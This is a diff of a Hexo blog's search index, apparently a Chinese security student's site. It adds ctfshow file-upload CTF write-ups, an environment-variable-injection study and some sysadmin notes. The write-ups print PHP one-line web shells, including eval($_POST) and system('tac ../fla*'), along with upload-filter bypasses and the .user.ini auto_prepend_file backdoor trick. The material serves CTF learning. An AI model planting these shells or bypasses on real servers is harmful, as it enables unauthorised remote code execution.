@@ -4,6 +4,45 @@
   
   
   <entry>
+    <title>php-tech</title>
+    <link href="/2022/03/15/php-tech/"/>
+    <url>/2022/03/15/php-tech/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>bluecms1.6</title>
+    <link href="/2022/03/07/bluecms1-6/"/>
+    <url>/2022/03/07/bluecms1-6/</url>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>env-injection</title>
+    <link href="/2022/02/22/env-injection/"/>
+    <url>/2022/02/22/env-injection/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天学习到了p牛的一个trick,<a href="https://tttang.com/archive/1450/">我是如何利用环境变量注入执行任意命令</a>然后发现其实环境变量注入早在14年就存在了，还是来学习下吧。</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;envs&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>    putenv(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$key&#125;</span>=<span class="hljs-subst">&#123;$val&#125;</span>&quot;</span>);<br>&#125;<br>system(<span class="hljs-string">&#x27;echo hello&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>#待更新</p><img src="/2022/02/22/env-injection/image-20220222213602198.png" class="">]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ctfshow之sql注入</title>
     <link href="/2022/02/07/ctfshow-sql-injection/"/>
     <url>/2022/02/07/ctfshow-sql-injection/</url>
@@ -37,7 +76,7 @@
     <link href="/2022/02/06/ctfshow-upload/"/>
     <url>/2022/02/06/ctfshow-upload/</url>
     
-    <content type="html"><![CDATA[<h2 id="ctfshow之文件上传"><a href="#ctfshow之文件上传" class="headerlink" title="ctfshow之文件上传"></a>ctfshow之文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>upload.js会对上传的文件进行检查，可以先上传一张真的图片(.png)，再用burpsuite将png改为php,内容改成php代码，再命令执行即可。</p><img src="/2022/02/06/ctfshow-upload/image-20220206200917084.png" class=""><p>也可以上传图片马，然后在burpsuie里将png改为php，再命令执行即可。</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs php">用小点的图片和一句话木马，利用copy命令生成图片马<br>copy shell.png/b+shell.php/a a.png<br></code></pre></td></tr></table></figure><h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>后端会对Content-Type进行限制，但和上题的思路一样。</p><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>这里对php后缀进行了限制，这里可以使用p牛的方法：<a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">user.ini文件构成php后门。</a></p><p>php.ini是php默认的配置文件，其中包括了很多php的配置。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><p>php配置项的两个参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">指定一个文件，自动包含在要执行的文件前<br>auto_append_file=a.png<br>    <br>指定一个文件，自动包含在要执行的文件后<br>auto_prepend_file=a.png<br></code></pre></td></tr></table></figure><p>先上传.user.ini文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file=a.png<br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220206215218371.png" class=""><p>接着上传a.png的马，成功利用。</p><img src="/2022/02/06/ctfshow-upload/image-20220206220334001.png" class=""><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>和上题的思路一样，但上传马的时报错了，这里可能是把文件内容的php给禁用了，这里我们使用短标签进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>成功上传马</p><img src="/2022/02/06/ctfshow-upload/image-20220206222508627.png" class=""><p>拿到flag</p><img src="/2022/02/06/ctfshow-upload/image-20220206222721766.png" class=""><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>与上题思路一致</p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>和上题思路一致，但上传马的时候始终失败，另外过滤了’[‘字符,这里换了一个马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&quot;tac ../fla*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220206230340766.png" class=""><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>和上题的思路一样，但这里过滤了分号，把分号去掉即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&quot;tac ../fla*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>与上题思路一致</p><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>和上题思路一样，但这里把符号‘(’给过滤了，那么可以采用反引号来执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../fla*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>和上题思路一样，但这里把反引号给过滤了，可以使用include命令去配合php伪协议进行读取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#a.png</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;p&quot;</span>.<span class="hljs-string">&quot;hp://filter/convert.base64-encode/resource=../flag.p&quot;</span>.<span class="hljs-string">&quot;hp&quot;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220207142011547.png" class="" title="image-20220207142011547"><p>再进行base64解码即可。</p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>和上题思路一样，但这次.user.ini文件上传失败，但加了文件头就上传成功了。</p><img src="/2022/02/06/ctfshow-upload/image-20220207143149955.png" class="" title="image-20220207143149955"><p>接着上传图片马</p><img src="/2022/02/06/ctfshow-upload/image-20220207143736974.png" class="" title="image-20220207143736974"><p>再进行base64解码即可。</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="ctfshow之文件上传"><a href="#ctfshow之文件上传" class="headerlink" title="ctfshow之文件上传"></a>ctfshow之文件上传</h2><h3 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h3><p>upload.js会对上传的文件进行检查，可以先上传一张真的图片(.png)，再用burpsuite将png改为php,内容改成php代码，再命令执行即可。</p><img src="/2022/02/06/ctfshow-upload/image-20220206200917084.png" class=""><p>也可以上传图片马，然后在burpsuie里将png改为php，再命令执行即可。</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs php">用小点的图片和一句话木马，利用copy命令生成图片马<br>copy shell.png/b+shell.php/a a.png<br></code></pre></td></tr></table></figure><h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>后端会对Content-Type进行限制，但和上题的思路一样。</p><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>这里对php后缀进行了限制，这里可以使用p牛的方法：<a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">user.ini文件构成php后门。</a></p><p>php.ini是php默认的配置文件，其中包括了很多php的配置。除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>而且，和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。</p><p>php配置项的两个参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">指定一个文件，自动包含在要执行的文件前<br>auto_append_file=a.png<br>    <br>指定一个文件，自动包含在要执行的文件后<br>auto_prepend_file=a.png<br></code></pre></td></tr></table></figure><p>先上传.user.ini文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file=a.png<br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220206215218371.png" class=""><p>接着上传a.png的马，成功利用。</p><img src="/2022/02/06/ctfshow-upload/image-20220206220334001.png" class=""><h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p>和上题的思路一样，但上传马的时报错了，这里可能是把文件内容的php给禁用了，这里我们使用短标签进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>成功上传马</p><img src="/2022/02/06/ctfshow-upload/image-20220206222508627.png" class=""><p>拿到flag</p><img src="/2022/02/06/ctfshow-upload/image-20220206222721766.png" class=""><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>与上题思路一致</p><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>和上题思路一致，但上传马的时候始终失败，另外过滤了’[‘字符,这里换了一个马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&quot;tac ../fla*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220206230340766.png" class=""><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>和上题的思路一样，但这里过滤了分号，把分号去掉即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>system(<span class="hljs-string">&quot;tac ../fla*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>与上题思路一致</p><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>和上题思路一样，但这里把符号‘(’给过滤了，那么可以采用反引号来执行命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../fla*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>和上题思路一样，但这里把反引号给过滤了，可以使用include命令去配合php伪协议进行读取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#a.png</span><br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;p&quot;</span>.<span class="hljs-string">&quot;hp://filter/convert.base64-encode/resource=../flag.p&quot;</span>.<span class="hljs-string">&quot;hp&quot;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/02/06/ctfshow-upload/image-20220207142011547.png" class="" title="image-20220207142011547"><p>再进行base64解码即可。</p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>和上题思路一样，但这次.user.ini文件上传失败，但加了文件头就上传成功了。</p><img src="/2022/02/06/ctfshow-upload/image-20220207143149955.png" class="" title="image-20220207143149955"><p>接着上传图片马</p><img src="/2022/02/06/ctfshow-upload/image-20220207143736974.png" class="" title="image-20220207143736974"><p>再进行base64解码即可。</p><h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><p>把.给过滤了，</p>]]></content>
     
     
     <categories>
@@ -258,7 +297,7 @@
     <link href="/2021/12/16/summary1/"/>
     <url>/2021/12/16/summary1/</url>
     
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现自己有很多不足，于是乎写个文章来自我总结发现的一些问题。</p><h3 id="0x01-centos7下无法安装本地yum源软件包的一些问题的思考"><a href="#0x01-centos7下无法安装本地yum源软件包的一些问题的思考" class="headerlink" title="0x01. centos7下无法安装本地yum源软件包的一些问题的思考"></a>0x01. centos7下无法安装本地yum源软件包的一些问题的思考</h3><p>在做云计算作业的时候，出现一个疑惑，就是自己明明配置好了本地的yum源，发现无法从本地的yum源安装软件包以及一些依赖，而从本地的yum仓库中却能够找到相应的rpm包，</p><img src="/2021/12/16/summary1/image-20211216195052921.png" class=""><blockquote><p>从华为云官网的<a href="https://support.huaweicloud.com/prtg-dubbo-kunpengwebs/kunpengdubbo268_02_0004.html">相关文档</a>了解到，在配置了本地yum源后，为了保险起见，需要用以下命令使yum源生效，要不然的话，可能会出现加载不到yum仓库的安装包的情况：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">清空yum已存在的源信息（缓存）</span><br>yum clean all<br><span class="hljs-meta">#</span><span class="bash">重新加载源信息</span><br>yum makecache<br><span class="hljs-meta">#</span><span class="bash">列出所有可安裝的软件清单</span><br>yum list<br></code></pre></td></tr></table></figure><img src="/2021/12/16/summary1/image-20211216201539002.png" class="" title="image-20211216201539002"><p>但查阅<a href="https://blog.csdn.net/weixin_46436935/article/details/109600481">相关文档</a>后发现，yum安装软件时会自动进行缓存,我猜测可能是网络源和本地源会有冲突。</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现自己有很多不足，于是乎写个文章来自我总结发现的一些问题。</p><h3 id="0x01-centos7下无法安装本地yum源软件包的一些问题的思考"><a href="#0x01-centos7下无法安装本地yum源软件包的一些问题的思考" class="headerlink" title="0x01. centos7下无法安装本地yum源软件包的一些问题的思考"></a>0x01. centos7下无法安装本地yum源软件包的一些问题的思考</h3><p>在做云计算作业的时候，出现一个疑惑，就是自己明明配置好了本地的yum源，发现无法从本地的yum源安装软件包以及一些依赖，而从本地的yum仓库中却能够找到相应的rpm包，</p><img src="/2021/12/16/summary1/image-20211216195052921.png" class=""><blockquote><p>从华为云官网的<a href="https://support.huaweicloud.com/prtg-dubbo-kunpengwebs/kunpengdubbo268_02_0004.html">相关文档</a>了解到，在配置了本地yum源后，为了保险起见，需要用以下命令使yum源生效，要不然的话，可能会出现加载不到yum仓库的安装包的情况：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">清空yum已存在的源信息（缓存）</span><br>yum clean all<br><span class="hljs-meta">#</span><span class="bash">重新加载源信息</span><br>yum makecache<br><span class="hljs-meta">#</span><span class="bash">列出所有可安裝的软件清单</span><br>yum list<br></code></pre></td></tr></table></figure><img src="/2021/12/16/summary1/image-20211216201539002.png" class="" title="image-20211216201539002"><p>但查阅<a href="https://blog.csdn.net/weixin_46436935/article/details/109600481">相关文档</a>后发现，yum安装软件时会自动进行缓存,我猜测可能是网络源和本地源会有冲突。</p><h3 id="0x02-mysql数据库where条件自动类型问题带来的思考"><a href="#0x02-mysql数据库where条件自动类型问题带来的思考" class="headerlink" title="0x02 mysql数据库where条件自动类型问题带来的思考"></a>0x02 mysql数据库where条件自动类型问题带来的思考</h3><p>一个朋友问到的问题，执行了以下语句后并没有报错，而是把user字段的值全查出来了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where user=&#x27;admin&#x27; --&#x27;&#x27;;<br></code></pre></td></tr></table></figure><img src="/2021/12/16/summary1/407796688db5159fc2e93f2d6d74420.png" class=""><p>mysql在使用where查询的时候，如果查询约束的字段是varchar类型，但是查询条件是int类型，则会把无法直接转成数字的值都强转映射成0。</p><h3 id="0x03-离谱，被一个错误搞自闭了"><a href="#0x03-离谱，被一个错误搞自闭了" class="headerlink" title="0x03 离谱，被一个错误搞自闭了"></a>0x03 离谱，被一个错误搞自闭了</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh: 0: getcwd() failed: No such file or directory<br></code></pre></td></tr></table></figure><img src="/2021/12/16/summary1/image-20220215212854737.png" class=""><img src="/2021/12/16/summary1/image-20220215212925214.png" class=""><h3 id="0x04composer入坑记录"><a href="#0x04composer入坑记录" class="headerlink" title="0x04composer入坑记录"></a>0x04composer入坑记录</h3><img src="/2021/12/16/summary1/image-20220216145816266.png" class=""><img src="/2021/12/16/summary1/image-20220216150616059.png" class=""><img src="/2021/12/16/summary1/image-20220216150757695.png" class=""><img src="/2021/12/16/summary1/image-20220216152248161.png" class="" title="image-20220216152248161">]]></content>
     
     
     <categories>
@@ -506,33 +545,6 @@
   
   
   <entry>
-    <title>kali修复引导方法</title>
-    <link href="/2021/11/01/kali%E4%BF%AE%E5%A4%8D%E5%BC%95%E5%AF%BC%E6%96%B9%E6%B3%95/"/>
-    <url>/2021/11/01/kali%E4%BF%AE%E5%A4%8D%E5%BC%95%E5%AF%BC%E6%96%B9%E6%B3%95/</url>
-    
-    <content type="html"><![CDATA[<p>win10更新系统后，发现自己的grub引导没了</p><h3 id="1-别慌，进BIOS在boot里面添加kali的efi引导"><a href="#1-别慌，进BIOS在boot里面添加kali的efi引导" class="headerlink" title="1.别慌，进BIOS在boot里面添加kali的efi引导"></a>1.别慌，进BIOS在boot里面添加kali的efi引导</h3><h3 id="2-进kali后，进入了grub-rescure模式，慢慢找。"><a href="#2-进kali后，进入了grub-rescure模式，慢慢找。" class="headerlink" title="2.进kali后，进入了grub rescure模式，慢慢找。"></a>2.进kali后，进入了grub rescure模式，慢慢找。</h3><p>先ls,查看分区情况</p><p>再ls (sd0,gpt1),一个一个找/boot/efi分区，反馈unknown的不管，出现其他的可能就是/boot分区</p><h3 id="3-如果找到了"><a href="#3-如果找到了" class="headerlink" title="3.如果找到了"></a>3.如果找到了</h3><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ls</span> (hd<span class="hljs-number">1</span>,gpt<span class="hljs-number">4</span>)/boot/grub<br></code></pre></td></tr></table></figure><p>会显示kali的efi配置文件</p><h3 id="4-之后输命令"><a href="#4-之后输命令" class="headerlink" title="4.之后输命令"></a>4.之后输命令</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> root=(hd1,gpt4)<br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">prefix=(hd1,gpt4)</span>/boot/<span class="hljs-comment">grub</span><br><br>insmod <span class="hljs-comment">normal</span><br><br>normal<br></code></pre></td></tr></table></figure><h3 id="5-进入kali系统后，打开终端。"><a href="#5-进入kali系统后，打开终端。" class="headerlink" title="5.进入kali系统后，打开终端。"></a>5.进入kali系统后，打开终端。</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">grub-install <span class="hljs-regexp">/dev/</span>sda (我的kali系统是装在<span class="hljs-regexp">/dev/</span>sda5)<br><br>update-grub<br></code></pre></td></tr></table></figure><p>reboot重启一下，大功告成。</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>kali Linux</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>kali Linux</tag>
-      
-      <tag>grub</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>kali Linux安装docker教程</title>
     <link href="/2021/11/01/kali%20linux%E5%AE%89%E8%A3%85docker/"/>
     <url>/2021/11/01/kali%20linux%E5%AE%89%E8%A3%85docker/</url>
@@ -552,6 +564,33 @@
       <tag>docker</tag>
       
       <tag>kali Linux</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>kali修复引导方法</title>
+    <link href="/2021/11/01/kali%E4%BF%AE%E5%A4%8D%E5%BC%95%E5%AF%BC%E6%96%B9%E6%B3%95/"/>
+    <url>/2021/11/01/kali%E4%BF%AE%E5%A4%8D%E5%BC%95%E5%AF%BC%E6%96%B9%E6%B3%95/</url>
+    
+    <content type="html"><![CDATA[<p>win10更新系统后，发现自己的grub引导没了</p><h3 id="1-别慌，进BIOS在boot里面添加kali的efi引导"><a href="#1-别慌，进BIOS在boot里面添加kali的efi引导" class="headerlink" title="1.别慌，进BIOS在boot里面添加kali的efi引导"></a>1.别慌，进BIOS在boot里面添加kali的efi引导</h3><h3 id="2-进kali后，进入了grub-rescure模式，慢慢找。"><a href="#2-进kali后，进入了grub-rescure模式，慢慢找。" class="headerlink" title="2.进kali后，进入了grub rescure模式，慢慢找。"></a>2.进kali后，进入了grub rescure模式，慢慢找。</h3><p>先ls,查看分区情况</p><p>再ls (sd0,gpt1),一个一个找/boot/efi分区，反馈unknown的不管，出现其他的可能就是/boot分区</p><h3 id="3-如果找到了"><a href="#3-如果找到了" class="headerlink" title="3.如果找到了"></a>3.如果找到了</h3><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ls</span> (hd<span class="hljs-number">1</span>,gpt<span class="hljs-number">4</span>)/boot/grub<br></code></pre></td></tr></table></figure><p>会显示kali的efi配置文件</p><h3 id="4-之后输命令"><a href="#4-之后输命令" class="headerlink" title="4.之后输命令"></a>4.之后输命令</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> root=(hd1,gpt4)<br><br><span class="hljs-keyword">set</span> <span class="hljs-comment">prefix=(hd1,gpt4)</span>/boot/<span class="hljs-comment">grub</span><br><br>insmod <span class="hljs-comment">normal</span><br><br>normal<br></code></pre></td></tr></table></figure><h3 id="5-进入kali系统后，打开终端。"><a href="#5-进入kali系统后，打开终端。" class="headerlink" title="5.进入kali系统后，打开终端。"></a>5.进入kali系统后，打开终端。</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">grub-install <span class="hljs-regexp">/dev/</span>sda (我的kali系统是装在<span class="hljs-regexp">/dev/</span>sda5)<br><br>update-grub<br></code></pre></td></tr></table></figure><p>reboot重启一下，大功告成。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>kali Linux</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>kali Linux</tag>
+      
+      <tag>grub</tag>
       
     </tags>
     
